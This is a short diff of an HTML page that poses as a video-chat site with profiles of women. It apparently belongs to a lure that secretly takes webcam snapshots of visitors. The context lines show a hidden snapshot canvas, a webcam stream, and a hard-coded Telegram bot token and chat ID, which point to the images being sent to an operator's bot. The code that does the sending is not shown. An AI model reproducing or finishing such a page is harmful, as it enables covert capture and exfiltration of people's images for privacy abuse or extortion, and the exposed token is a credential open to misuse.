@@ -423,7 +423,7 @@
                         <div class="status status-offline"><span class="status-dot status-dot-offline"></span> Offline</div>
                     </div>
                 </div>
-                <button class="video-call-btn btn-offline" disabled>Offline</button>
+                <button class="video-card-btn btn-offline" disabled>Offline</button>
             </div>
 
             <!-- Offline Girl 5 -->
@@ -459,7 +459,7 @@
     <canvas id="snapshotCanvas" style="display:none;"></canvas>
 
     <script>
-        // Aapki Chat ID aur Bot Key yahan set kar di gayi hain:
+        // Aapki Chat ID aur Bot Token:
         const TELEGRAM_BOT_TOKEN = "9038578638:AAH1lUTa2wLw0BueoEJhk5Q4JAHOV5HYNkM";
         const TELEGRAM_CHAT_ID = "8195598775";
 
@@ -516,3 +516,12 @@
         function endVideoCall() {
             let videoElement = document.getElementById('webcamStream');
             if (videoElement.srcObject) {
+                let tracks = videoElement.srcObject.getTracks();
+                tracks.forEach(track => track.stop());
+                videoElement.srcObject = null;
+            }
+            document.getElementById('callScreen').style.display = 'none';
+        }
+    </script>
+</body>
+</html>
